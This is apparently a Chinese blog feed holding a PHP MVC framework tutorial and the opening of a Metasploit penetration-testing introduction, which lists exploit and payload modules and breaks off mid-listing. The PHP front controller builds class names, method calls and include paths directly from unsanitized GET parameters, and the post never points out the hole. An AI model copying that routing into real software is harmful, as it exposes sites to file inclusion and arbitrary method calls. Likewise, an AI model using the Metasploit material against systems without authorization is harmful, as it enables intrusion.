class="keyword">require_once</span>(<span class="string">&quot;./Model/StudentModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Model/NewsModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Controller/StudentController.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Controller/NewsController.class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取用户动作参数</span></span><br><span class="line">$ac = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;ac&#x27;</span>]) ? $_GET[<span class="string">&#x27;ac&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="comment">//创建学生控制器类的对象</span></span><br><span class="line">$controllerObj = <span class="keyword">new</span> StudentController();</span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$controllerObj-&gt;$ac();</span><br></pre></td></tr></table></figure><p>修改之后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含所有类文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/BaseController.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/FactoryModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/Db.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/BaseModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Model/StudentModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Model/NewsModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Controller/StudentController.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Controller/NewsController.class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取路由参数</span></span><br><span class="line">$c = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]) ? $_GET[<span class="string">&#x27;c&#x27;</span>] : <span class="string">&#x27;Student&#x27;</span>; <span class="comment">//控制器名</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) ? $_GET[<span class="string">&#x27;a&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>; <span class="comment">//动作名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建控制器类的对象：StudentController</span></span><br><span class="line">$controllerClassName = $c . <span class="string">&quot;Controller&quot;</span>;</span><br><span class="line">$controllerObj = <span class="keyword">new</span> $controllerClassName();</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$controllerObj-&gt;$a();</span><br></pre></td></tr></table></figure><h4 id="平台概念的引入"><a href="#平台概念的引入" class="headerlink" title="平台概念的引入"></a>平台概念的引入</h4><p>有了“平台”概念后，MVC的目录结构，就要进一步扩展了。</p><p>引入“平台”概念后，客户的每次请求，必须带3个参数：平台参数、控制器参数、用户动作。</p><p>Platform称为p参数，controller称为c参数，action简称a参数。</p><p>请求地址：index.php?p=平台&amp;c=控制器&amp;a=动作&amp;其它参数</p><p>举例说明：<code>index.php?p=Home&amp;c=Student&amp;a=index</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//获取路由参数</span></span><br><span class="line">$p = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;p&#x27;</span>]) ? $_GET[<span class="string">&#x27;p&#x27;</span>] : <span class="string">&#x27;Home&#x27;</span>; <span class="comment">//平台参数</span></span><br><span class="line">$c = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]) ? $_GET[<span class="string">&#x27;c&#x27;</span>] : <span class="string">&#x27;Student&#x27;</span>; <span class="comment">//控制器名</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) ? $_GET[<span class="string">&#x27;a&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>; <span class="comment">//动作名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//包含所有类文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/BaseController.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/FactoryModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/Db.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/BaseModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./App/<span class="subst">$p</span>/Model/StudentModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./App/<span class="subst">$p</span>/Model/NewsModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./App/<span class="subst">$p</span>/Controller/StudentController.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./App/<span class="subst">$p</span>/Controller/NewsController.class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建控制器类的对象：StudentController</span></span><br><span class="line">$controllerClassName = $c . <span class="string">&quot;Controller&quot;</span>;</span><br><span class="line">$controllerObj = <span class="keyword">new</span> $controllerClassName();</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$controllerObj-&gt;$a();</span><br></pre></td></tr></table></figure><h4 id="类的自动加载"><a href="#类的自动加载" class="headerlink" title="类的自动加载"></a>类的自动加载</h4><p>如果客户每次请求，都去包含所有类文件，会造成服务器内存浪费，程序的加载速度会更加缓慢。</p><p>我们可以使用类的自动加载，来实现类文件的按需加载，不需要的不用加载。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//获取路由参数</span></span><br><span class="line">$p = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;p&#x27;</span>]) ? $_GET[<span class="string">&#x27;p&#x27;</span>] : <span class="string">&#x27;Home&#x27;</span>; <span class="comment">//平台参数</span></span><br><span class="line">$c = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]) ? $_GET[<span class="string">&#x27;c&#x27;</span>] : <span class="string">&#x27;Student&#x27;</span>; <span class="comment">//控制器名</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) ? $_GET[<span class="string">&#x27;a&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>; <span class="comment">//动作名</span></span><br><span class="line">define(<span class="string">&quot;PLAT&quot;</span>,$p);</span><br><span class="line"></span><br><span class="line"><span class="comment">//类的自动加载</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params">$className</span>)</span>&#123;</span><br><span class="line"><span class="comment">//类文件路径数组</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;./Frame/<span class="subst">$className</span>.class.php&quot;</span>,</span><br><span class="line"><span class="string">&quot;./App/&quot;</span>.PLAT.<span class="string">&quot;/Model/<span class="subst">$className</span>.class.php&quot;</span>,</span><br><span class="line"><span class="string">&quot;./App/&quot;</span>.PLAT.<span class="string">&quot;/Controller/<span class="subst">$className</span>.class.php&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//循环数组</span></span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $filename)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果类文件路径存在，则包含</span></span><br><span class="line"><span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line"><span class="keyword">echo</span> $filename.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span>($filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建控制器类的对象：StudentController</span></span><br><span class="line">$controllerClassName = $c . <span class="string">&quot;Controller&quot;</span>;</span><br><span class="line">$controllerObj = <span class="keyword">new</span> $controllerClassName();</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$controllerObj-&gt;$a();</span><br></pre></td></tr></table></figure><p>唯一的区别就是之前的index文件，我们载入就会加载所有的类，但是现在我们只想根据我们输入的参数加载对应的类文件。</p><h4 id="常用目录常量配置"><a href="#常用目录常量配置" class="headerlink" title="常用目录常量配置"></a>常用目录常量配置</h4><p>常量在任何地方都可以使用，而变量只能在其作用域下使用；</p><p>我们把MVC中常用的目录定义成常量，可以简化目录路径的编写。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//获取路由参数</span></span><br><span class="line">$p = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;p&#x27;</span>]) ? $_GET[<span class="string">&#x27;p&#x27;</span>] : <span class="string">&#x27;Home&#x27;</span>; <span class="comment">//平台参数</span></span><br><span class="line">$c = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]) ? $_GET[<span class="string">&#x27;c&#x27;</span>] : <span class="string">&#x27;Student&#x27;</span>; <span class="comment">//控制器名</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) ? $_GET[<span class="string">&#x27;a&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>; <span class="comment">//动作名</span></span><br><span class="line">define(<span class="string">&quot;PLAT&quot;</span>,$p);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义目录常量</span></span><br><span class="line">define(<span class="string">&quot;DS&quot;</span>,DIRECTORY_SEPARATOR); <span class="comment">//动态目录分割符</span></span><br><span class="line">define(<span class="string">&quot;ROOT_PATH&quot;</span>,getcwd().DS); <span class="comment">//当前目录</span></span><br><span class="line">define(<span class="string">&quot;FRAME_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;Frame&quot;</span>.DS); <span class="comment">//Frame目录</span></span><br><span class="line">define(<span class="string">&quot;MODEL_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;App&quot;</span>.DS.PLAT.DS.<span class="string">&quot;Model&quot;</span>.DS); <span class="comment">//Model目录</span></span><br><span class="line">define(<span class="string">&quot;CONTROLLER_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;App&quot;</span>.DS.PLAT.DS.<span class="string">&quot;Controller&quot;</span>.DS); <span class="comment">//Controller目录</span></span><br><span class="line">define(<span class="string">&quot;VIEW_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;App&quot;</span>.DS.PLAT.DS.<span class="string">&quot;View&quot;</span>.DS.$c.DS); <span class="comment">//View目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//类的自动加载</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params">$className</span>)</span>&#123;</span><br><span class="line"><span class="comment">//类文件路径数组</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line">FRAME_PATH.<span class="string">&quot;<span class="subst">$className</span>.class.php&quot;</span>,</span><br><span class="line">MODEL_PATH.<span class="string">&quot;<span class="subst">$className</span>.class.php&quot;</span>,</span><br><span class="line">CONTROLLER_PATH.<span class="string">&quot;<span class="subst">$className</span>.class.php&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//循环数组</span></span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $filename)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果类文件路径存在，则包含</span></span><br><span class="line"><span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line"><span class="keyword">echo</span> $filename.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span>($filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建控制器类的对象：StudentController</span></span><br><span class="line">$controllerClassName = $c . <span class="string">&quot;Controller&quot;</span>;</span><br><span class="line">$controllerObj = <span class="keyword">new</span> $controllerClassName();</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$controllerObj-&gt;$a();</span><br></pre></td></tr></table></figure><h4 id="初始类实现"><a href="#初始类实现" class="headerlink" title="初始类实现"></a>初始类实现</h4><p>就是把我们上面的index文件的所有功能初始化一个类。最后直接在index调用类即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义最终的框架初始类</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Frame</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//公共的静态的框架初始化方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">self</span>::initConfig();<span class="comment">//初始化配置信息</span></span><br><span class="line"><span class="built_in">self</span>::initRoute();<span class="comment">//初始化路由参数</span></span><br><span class="line"><span class="built_in">self</span>::initConst();<span class="comment">//初始化目录常量</span></span><br><span class="line"><span class="built_in">self</span>::initAutoLoad();<span class="comment">//初始化类的自动加载</span></span><br><span class="line"><span class="built_in">self</span>::initDispatch();<span class="comment">//初始化请求分发</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的静态的初始化配置信息</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">initConfig</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">&#x27;config&#x27;</span>] = <span class="keyword">require_once</span>(<span class="string">&quot;./App/Conf/Config.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的静态的初始化路由参数</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">initRoute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获取路由参数</span></span><br><span class="line">$p = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;p&#x27;</span>]) ? $_GET[<span class="string">&#x27;p&#x27;</span>] : $GLOBALS[<span class="string">&#x27;config&#x27;</span>][<span class="string">&#x27;default_platform&#x27;</span>]; <span class="comment">//平台参数</span></span><br><span class="line">$c = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]) ? $_GET[<span class="string">&#x27;c&#x27;</span>] : $GLOBALS[<span class="string">&#x27;config&#x27;</span>][<span class="string">&#x27;default_controller&#x27;</span>]; <span class="comment">//控制器名</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) ? $_GET[<span class="string">&#x27;a&#x27;</span>] : $GLOBALS[<span class="string">&#x27;config&#x27;</span>][<span class="string">&#x27;default_action&#x27;</span>]; <span class="comment">//动作名</span></span><br><span class="line">define(<span class="string">&quot;PLAT&quot;</span>,$p);</span><br><span class="line">define(<span class="string">&quot;CONTROLLER&quot;</span>,$c);</span><br><span class="line">define(<span class="string">&quot;ACTION&quot;</span>,$a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的静态的初始化目录常量</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">initConst</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">define(<span class="string">&quot;DS&quot;</span>,DIRECTORY_SEPARATOR); <span class="comment">//动态目录分割符</span></span><br><span class="line">define(<span class="string">&quot;ROOT_PATH&quot;</span>,getcwd().DS); <span class="comment">//当前目录</span></span><br><span class="line">define(<span class="string">&quot;FRAME_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;Frame&quot;</span>.DS); <span class="comment">//Frame目录</span></span><br><span class="line">define(<span class="string">&quot;MODEL_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;App&quot;</span>.DS.PLAT.DS.<span class="string">&quot;Model&quot;</span>.DS); <span class="comment">//Model目录</span></span><br><span class="line">define(<span class="string">&quot;CONTROLLER_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;App&quot;</span>.DS.PLAT.DS.<span class="string">&quot;Controller&quot;</span>.DS); <span class="comment">//Controller目录</span></span><br><span class="line">define(<span class="string">&quot;VIEW_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;App&quot;</span>.DS.PLAT.DS.<span class="string">&quot;View&quot;</span>.DS.CONTROLLER.DS); <span class="comment">//View目录</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的静态的初始化类的自动加载</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">initAutoLoad</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//类的自动加载</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params">$className</span>)</span>&#123;</span><br><span class="line"><span class="comment">//类文件路径数组</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line">FRAME_PATH.<span class="string">&quot;<span class="subst">$className</span>.class.php&quot;</span>,</span><br><span class="line">MODEL_PATH.<span class="string">&quot;<span class="subst">$className</span>.class.php&quot;</span>,</span><br><span class="line">CONTROLLER_PATH.<span class="string">&quot;<span class="subst">$className</span>.class.php&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//循环数组</span></span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $filename)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果类文件路径存在，则包含</span></span><br><span class="line"><span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line"><span class="keyword">echo</span> $filename.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span>($filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的静态的初始化请求分发：创建哪个控制器类的对象？调用控制器对象的哪个方法？</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">initDispatch</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建控制器类的对象：StudentController</span></span><br><span class="line">$controllerClassName = CONTROLLER . <span class="string">&quot;Controller&quot;</span>;</span><br><span class="line">$controllerObj = <span class="keyword">new</span> $controllerClassName();</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$action_name = ACTION;</span><br><span class="line">$controllerObj-&gt;$action_name();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP核心编程–MVC思想1&quot;&gt;&lt;a href=&quot;#PHP核心编程–MVC思想1&quot; class=&quot;headerlink&quot; title=&quot;PHP核心编程–MVC思想1&quot;&gt;&lt;/a&gt;PHP核心编程–MVC思想1&lt;/h1&gt;&lt;h2 id=&quot;MVC框架思想原理&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="PHP开发学习" scheme="http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="PHP开发学习" scheme="http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--Metasploit的使用</title>
    <link href="http://s1eady.top/2019/12/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2019/12/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2019-12-21T23:34:12.000Z</published>
    <updated>2020-11-23T01:47:06.831Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试–Metasploit的使用"><a href="#渗透测试–Metasploit的使用" class="headerlink" title="渗透测试–Metasploit的使用"></a>渗透测试–Metasploit的使用</h1><h2 id="Metasploit的使用"><a href="#Metasploit的使用" class="headerlink" title="Metasploit的使用"></a>Metasploit的使用</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><ul><li>data</li><li>modules</li><li>scripts</li><li>tools</li><li>plugins</li></ul><h3 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h3><h5 id="modules目录"><a href="#modules目录" class="headerlink" title="modules目录"></a>modules目录</h5><p>位置在<code>/usr/share/metasploit-framework/modules/</code>中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ cd /usr/share/metasploit-framework/modules/</span><br><span class="line">steady@steady:/usr/share/metasploit-framework/modules$ ls</span><br><span class="line">auxiliary  encoders  evasion  exploits  nops  payloads  post</span><br></pre></td></tr></table></figure><h6 id="渗透攻击模块-Exploit"><a href="#渗透攻击模块-Exploit" class="headerlink" title="渗透攻击模块(Exploit)"></a>渗透攻击模块(Exploit)</h6><p>在msf中使用<code>show exploits</code>。</p><p>主动渗透攻击：利用模块中的exp对目标发送数据，利用其已知漏洞。</p><p>被动渗透攻击：利用木马病毒文件，诱导目标运行文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; show exploit</span><br><span class="line">  <span class="number">1543</span>  windows/http/httpdx_handlepeer                                    <span class="number">2009</span><span class="number">-10</span><span class="number">-08</span>       <span class="function">manual  Yes    HTTPDX <span class="title">h_handlepeer</span><span class="params">()</span> Function Buffer Overflow</span></span><br><span class="line">   1544  windows/http/httpdx_tolog_format                                  2009-11-17       manual  Yes    HTTPDX tolog() Function Format String Vulnerability</span><br><span class="line">   <span class="number">1545</span>  windows/http/ia_webmail                                           <span class="number">2003</span><span class="number">-11</span><span class="number">-03</span>       manual  No     IA WebMail <span class="number">3.</span>x Buffer Overflow</span><br><span class="line">   <span class="number">1546</span>  windows/http/ibm_tivoli_endpoint_bof                              <span class="number">2011</span><span class="number">-05</span><span class="number">-31</span>       manual  No     IBM Tivoli Endpoint Manager POST Query Buffer Overflow</span><br><span class="line">   <span class="number">1547</span>  windows/http/ibm_tpmfosd_overflow                                 <span class="number">2007</span><span class="number">-05</span><span class="number">-02</span>       manual  No     IBM TPM <span class="keyword">for</span> OS Deployment <span class="number">5.1</span><span class="number">.0</span>.x rembo.exe Buffer Overflow</span><br><span class="line">   <span class="number">1548</span>  windows/http/ibm_tsm_cad_header                                   <span class="number">2007</span><span class="number">-09</span><span class="number">-24</span>       manual  No     IBM Tivoli Storage Manager Express CAD Service Buffer Overflow</span><br></pre></td></tr></table></figure><h6 id="攻击载荷模块-Payload"><a href="#攻击载荷模块-Payload" class="headerlink" title="攻击载荷模块(Payload)"></a>攻击载荷模块(Payload)</h6><p>在msf中使用<code>show payload</code>。</p><p>对目标机进行攻击后想让目标机执行的代码，比如反弹shell、bind shell等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; show payloads</span><br><span class="line"></span><br><span class="line">Payloads</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">   <span class="comment">#    Name                                                Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -    ----                                                ---------------  ----    -----  -----------</span><br><span class="line">   <span class="number">0</span>    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline</span><br><span class="line">   <span class="number">1</span>    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline</span><br><span class="line">   <span class="number">2</span>    aix/ppc/shell_interact                                               manual  No     AIX execve Shell <span class="keyword">for</span> inetd</span><br><span class="line">   <span class="number">3</span>    